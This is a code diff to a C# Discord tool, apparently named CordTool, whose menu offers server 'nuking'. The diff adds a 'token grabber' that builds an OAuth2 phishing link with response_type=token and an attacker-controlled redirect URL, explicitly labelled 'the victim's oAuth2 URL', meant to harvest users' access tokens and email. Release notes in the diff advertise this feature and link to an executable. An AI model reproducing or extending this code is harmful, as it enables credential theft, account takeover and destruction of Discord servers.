@@ -49,7 +49,10 @@ namespace CordTool
                         return;
                     case '5':
                         Console.Clear();
-                        WebhookUserID2WebhookURL();
+                        await TokenGrab();
+                        Console.WriteLine("Press any key to return to menu");
+                        Console.ReadKey();
+                        Console.Clear();
                         break;
                     case '4':
                         nukeServerBetter();
@@ -140,7 +143,7 @@ namespace CordTool
             Console.WriteLine("2. Nuke Server");
             Console.WriteLine("3. Login to a Bot (IN DEV)");
             Console.WriteLine("4. Nuke Server Better (Reccommended)");
-            Console.WriteLine("5. Grab Webhook URL from User ID [Copy User ID while right clicking on a webhooks profile.]");
+            Console.WriteLine("5. Get a discord user's token");
             Console.WriteLine("6. Exit");
             Console.WriteLine("P. Release Notes");
             Console.WriteLine("Y. GUI version");
@@ -196,13 +199,23 @@ namespace CordTool
 
         }
 
-        static void WebhookUserID2WebhookURL() {
+        static async Task TokenGrab() {
+            Console.Write("Enter Application ID: ");
+            string appid = Console.ReadLine();
+            // asking for the oauth2 link
 
-            Console.WriteLine("You didn't think this was actually avaliable... did you?");
+            Console.Write("Enter oAuth2 link: ");
+            string oauth2link = Console.ReadLine();
 
-            Console.WriteLine("Click anything to exit.");
-            Console.ReadKey();
+            // asking for the redirect url
+            Console.Write("Enter your URL (used for redirect): ");
+            string redirecturl = Console.ReadLine();
 
+
+
+            string victimsoauth2link = oauth2link + "&client_id=" + appid + "&scope=identify%20guilds%20guilds.join%20email&response_type=token&redirect_uri=" + redirecturl;
+
+            Console.WriteLine("Here is the victim's oAuth2 URL (you'll have to set it up yourself, like sending authorizationns to a webhook, or something!): " + victimsoauth2link);
         }
 
         static void loadinghaha()
@@ -437,6 +450,21 @@ namespace CordTool
                     Console.ReadKey();
                     Console.Clear();
                     break;
+                case '6':
+                    Console.WriteLine("Version 6.0.0 - Bullshit");
+                    Console.WriteLine("Actually nothing, i just wasted my time lol");
+                    Console.WriteLine("Click any key to exit.");
+                    Console.ReadKey();
+                    Console.Clear();
+                    break;
+                case '7':
+                    Console.WriteLine("Version 7.0.0 - 7th release, token grabber via oauth2 (only generates a link though!).");
+                    Console.WriteLine("This version has a token grabber, which generates an oauth2 link for you to use.");
+                    Console.WriteLine("Download: https://github.com/epicinver/cordtool/releases/v7.0.0/setup.exe");
+                    Console.WriteLine("Click any key to exit.");
+                    Console.ReadKey();
+                    Console.Clear();
+                    break;
             }
         }
 
@@ -445,7 +473,7 @@ namespace CordTool
             Console.Clear();
             Console.WriteLine("Checking for updates...");
 
-            const string VERSION_UPDATE_VAR = "6.0.0"; // current version
+            const string VERSION_UPDATE_VAR = "7.0.0"; // current version
             const string GITHUB_API = "https://api.github.com/repos/epicinver/cordtool/releases/latest";
 
             try
